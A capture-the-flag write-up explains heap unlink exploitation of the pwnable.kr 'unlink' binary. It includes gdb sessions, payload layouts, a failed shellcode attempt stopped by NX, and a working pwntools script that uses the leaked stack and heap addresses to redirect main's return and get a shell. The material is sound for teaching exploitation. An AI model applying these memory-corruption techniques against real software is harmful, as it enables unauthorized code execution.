# Unlink

Consider the unlink code:

```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
```

If we have control over `P` we can essentialy get the following write primitive: for two pointers `p1` and `p2`, we can preform:

```c
/**
 * Notice that p1 is P->bk and p2 is P->fd.
 */
void **p1
void **p2;
*p1 = p2;
*(p2 + 1) = p1;
```

Now, if `p1` is the location of the saved `eip` on the stack, we can let `p2` point to `shell` and win, right?

Lets try in `gdb` first - the address of `shell` is `0x080484eb`, and the address of `eip` on the stack is `0xfff241dc`. We can also see that the address `B` on the heap is `0x09cc4428`. Lets try to set `B->fd` and `B->bk` manually:

```text
# Set a breakpoint at unlink...
# Setting B->fd to be the of the shell function.
(gdb) set {unsigned int}0x08c6b428 = 0x080484eb
# Setting B->bk to be the address of eip on the stack.
(gdb) set {unsigned int}0x08c6b428 = 0xfff241dc
```

Now lets try to continue:

```text
Program received signal SIGSEGV, Segmentation fault.
0x08048521 in unlink ()
```

Hmm... Well, we kinda saw it coming, didnt we? We are trying to write to the code of `shell`, will obviously fail. We can see that in the dump:

```text
(gdb) disas 0x08048521
Dump of assembler code for function unlink:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     sub    $0x10,%esp
   0x0804850a <+6>:     mov    0x8(%ebp),%eax
   0x0804850d <+9>:     mov    0x4(%eax),%eax
   0x08048510 <+12>:    mov    %eax,-0x4(%ebp)
   0x08048513 <+15>:    mov    0x8(%ebp),%eax
   0x08048516 <+18>:    mov    (%eax),%eax
   0x08048518 <+20>:    mov    %eax,-0x8(%ebp)
   0x0804851b <+23>:    mov    -0x8(%ebp),%eax
   0x0804851e <+26>:    mov    -0x4(%ebp),%edx
=> 0x08048521 <+29>:    mov    %edx,0x4(%eax)
   0x08048524 <+32>:    mov    -0x4(%ebp),%eax
   0x08048527 <+35>:    mov    -0x8(%ebp),%edx
   0x0804852a <+38>:    mov    %edx,(%eax)
   0x0804852c <+40>:    nop
   0x0804852d <+41>:    leave
   0x0804852e <+42>:    ret
End of assembler dump.
```
We see we got the `SEGV` when we tried to write to the code `shell`.

New idea: we need the memory that we write to actually be writeable, so we'll just use the heap! We'll a payload of this sort:

```text
+-----------+---------+-----------+-----------+---------+---------+---------+
| 2 bytes   | 2 bytes | 4 bytes   | 5 bytes   | 3 bytes | 4 bytes | 4 bytes |
+-----------+---------+-----------+-----------+---------+---------+---------+
| short jmp | unused  | overidden | jmp shell | unused  | pl addr | ip addr |
+-----------+---------+-----------+-----------+---------+---------+---------+
```
Where the `overriden` part is overriden by `unlink`.

Now for some fun offsets calculations! Using `gdb`, we see that if `A` is `0x0878f410`, then `B` is `0x0878f428`, which means `&(A->buf)` is `0x0878f418` and that the we have 16 bytes to work with. Seems alright!

And for out payload:
* we need a short jump, that is `\xeb\x06` - jumping 6 byte into the future, over the bytes overriden by `unlink`.
* We have 2 unused bytes: `\x90\x90`.
* Another 4 unused bytes: `\x90\x90\x90\x90`.
* A jump to the `shell` function: `\xe9<offset_to_shell>` - we can get that from the heap address leak (remembering that the address of `shell` is `0x080484eb`, and that we are `21` bytes away from the heap address leak).
* Another 3 unused bytes: `\x90\x90\x90`.
* Payload address - we get it from the heap address leak (`+8` for `fd` and `bk`).
* Saved `eip` address on the stack - we get it from the stack address leak (`-24` from testing with `gdb`).
* Dont forget endiannes!

Seems to be good, lets give it a try! Trying with `gdb` first, just to check how things are going...

```text
# A lot of setting up, lets look at the shellcode we put on the heap:
(gdb) x/i 0xa049418
   0xa049418:   jmp    0xa049420
(gdb) x/i 0xa049420
   0xa049420:   jmp    0x80484eb <shell>
# seems good!
```

Continue... and we get another `SEGV`! This entire time the heap was non-executable (NX). Well. This sucks. I have no idea how to pass this. Let's dig in deeper!

Hmm... this piece of code seems really unusual:

```text
(gdb) disas main
   0x0804852f <+0>:     lea    0x4(%esp),%ecx
   0x08048533 <+4>:     and    $0xfffffff0,%esp
   0x08048536 <+7>:     pushl  -0x4(%ecx)
   0x08048539 <+10>:    push   %ebp
   0x0804853a <+11>:    mov    %esp,%ebp
   0x0804853c <+13>:    push   %ecx
   [lots of code...]
   0x080485f2 <+195>:   call   0x8048504 <unlink>
   0x080485f7 <+200>:   add    $0x10,%esp
   0x080485fa <+203>:   mov    $0x0,%eax
   0x080485ff <+208>:   mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:   leave
   0x08048603 <+212>:   lea    -0x4(%ecx),%esp
   0x08048606 <+215>:   ret
End of assembler dump.
```

Lets follow the flow of this weird code. Suppose the return address for main was stored on the stack in `0x1337`, and therefore `esp` is `0x1333`.

* In `+0`, we set `ecx` to the address of the return address on the stack, that is, `0x1337`.
* We do some stuff, and in `+13`, this value is push onto stack again, suppose to `0x420`.
* We execute the code of `main`.
* In `+208`, we move the address stored in `0x420` stack address to `ecx`.
* In `+212` we fix `esp`, and in `+215` we `ret`, which means we move the return address stored in `(%ecx)` to `eip`.

Where can we step in? Of course, if we override `0x420` to point to a place the heap, which in turn also points to the address of `shell`, we win! And we wont have any problems since both the stack and the heap are writeable, and were not trying to execute any code out of the `.text` segment.

So our payload will look something like this:

```text
+----------+---------+---------+------------+
| 16 bytes | 4 bytes | 4 bytes | 4 bytes    |
+----------+---------+---------+------------+
| unused   | &shell  | st addr | shell addr |
+----------+---------+---------+------------+
```

* 16 unused bytes.
* The place we saved the address of `shell` - we get it from heap address leak (`+0x24`).
* The stack address we need to redirect - we get it from the stack address leak (`+10`, using `gdb`).
* The address of `shell` - `0x80484eb`.

Lets put together a quick `pwntools` solution:

```python
import re

from pwn import *

ssh_conn = ssh(
    'unlink',
    'pwnable.kr',
    2222,
    'guest'
)

HEXNUM_RE = re.compile(r'0x[0-9a-f]+')
GET_SHELL_STRING = 'now that you have leaks, get shell!'
SHELL_FUNC = 0x80484eb

unlink_ps = ssh_conn.process(['./unlink'])

data = unlink_ps.recvuntil(GET_SHELL_STRING)

stack, heap = (int(hexstr, 16) for hexstr in re.findall(HEXNUM_RE, data))
print '[+] stack address - {stack}'.format(stack=hex(stack))
print '[+] heap address - {heap}'.format(heap=hex(heap))

unlink_ps.send('A'*16 + p32(heap+0x24) + p32(stack+0x10) + p32(SHELL_FUNC))
unlink_ps.interactive()
```

And lo and behold, it works!
